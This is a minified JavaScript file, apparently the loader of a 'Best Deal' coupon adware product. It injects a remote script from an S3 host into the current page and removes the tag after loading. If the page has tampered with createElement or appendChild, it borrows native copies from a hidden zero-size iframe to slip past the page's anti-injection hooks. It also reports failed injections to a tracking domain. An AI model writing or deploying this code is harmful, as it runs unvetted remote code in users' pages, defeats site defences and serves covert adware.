var BD_Injector = function() {
        function e() {}
        return e.getAltDocument = function() {
            if (null == e.altDocument) {
                var t = document.createElement("iframe");
                t.height = t.width = "0", document.body.appendChild(t), e.altDocument = t.contentWindow.document
            }
            return e.altDocument
        }, e.injectScript = function(t, n, o) {
            var a = null,
                r = !0,
                i = !1,
                d = document.createElement;
            d.toString().indexOf("[native code]") > 0 ? a = document.createElement("script") : (a = e.getAltDocument().createElement.call(document, "script"), r = !1), a.onload = a.onreadystatechange = function() {
                i || a.readyState && "loaded" !== a.readyState && "complete" !== a.readyState || (i = !0, a.parentNode && a.parentNode.removeChild(a), n && window.setTimeout(function() {
                    n()
                }, 1))
            }, a.onerror = function(e) {
                i || (i = !0, o && window.setTimeout(function() {
                    o(e)
                }, 1))
            };
            var c = document.getElementsByTagName("head")[0],
                u = c.appendChild;
            return u.toString().indexOf("[native code]") > 0 ? c.appendChild(a) : (e.getAltDocument().appendChild.call(c, a), r = !1), a.src = t, r
        }, e.altDocument = null, e
    }(),
    BD_BootstrapHelper = function() {
        function e() {}
        return e.bootstrap = function(t, n, o) {
            void 0 === o && (o = []), o && o.length || (o = window.BD_DOMAIN ? [window.BD_DOMAIN] : ["um-prod-419380685.us-east-1.elb.amazonaws.com"]);
            var a = e.selectDomain(o);
           
            var r = "//mirai-client-assets.s3.amazonaws.com/public/app.js",
                i = "BD.APP.BestDealApp",
                d = BD_Injector.injectScript(r, function() {
                    var n = e.instantiateClass(i);
                   n.init(t, a)
                }, function() {
                    e.notify(a, t, "exception", {
                        ex: "Failure to get Best Deal App"
                    }, .01)
                });
            
            window.setTimeout(function() {
                var n = void 0 == window.BD;
                n && e.notify(a, t, "generic", {
                    subtype: "badinj",
                    nativeinj: "" + d
                }, .01)
            }, 3e3)
        }, e.notify = function(e, t, n, o, a) {
          
    
        }, e.selectDomain = function(e) {
            for (var t = [], n = 0; n < e.length; n++) e[n] && e[n].length && -1 == e[n].indexOf("$") && t.push(e[n]);
            var n = Math.floor(Math.random() * t.length);
            return t[n]
        }, e.instantiateClass = function(e) {
            for (var t = e.split("."), n = window, o = 0; o < t.length; o++) n = n[t[o]];
            var a = new n;
            return a
        }, e
    }(),
    params = {       
        partnerCode: "mr_right",
        subId: "mr",
        providerName: "right_coupon",
        providerLink: "http://right-coupon.com"
    }
	
	if (location.search) {
		var parts = location.search.substring(1).split('&');

		for (var i = 0; i < parts.length; i++) {
			var nv = parts[i].split('=');
			if (!nv[0]) continue;
			params[nv[0]] = nv[1] || true;
		}
	}
    version = "0_0_001";
BD_BootstrapHelper.bootstrap(params, version);/**
 * Created by arotbard on 12-Mar-15.
 */
